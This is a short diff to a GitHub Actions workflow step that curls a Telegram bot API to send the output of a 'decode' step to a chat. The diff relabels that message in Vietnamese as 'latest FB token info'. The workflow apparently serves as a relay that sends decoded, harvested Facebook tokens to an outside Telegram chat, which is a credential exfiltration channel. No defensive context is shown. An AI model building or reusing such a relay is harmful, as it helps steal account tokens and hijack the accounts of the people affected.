@@ -26,5 +26,5 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/sendMessage \
             -d chat_id=${{ secrets.CHAT_ID }} \
-            --data-urlencode "text= Log mới (giải mã):%0A<pre>${{ steps.decode.outputs.log }}</pre>" \
+            --data-urlencode "text=THÔNG TIN TOKEN FB MỚI NHẤT<pre>${{ steps.decode.outputs.log }}</pre>" \
             -d parse_mode=HTML
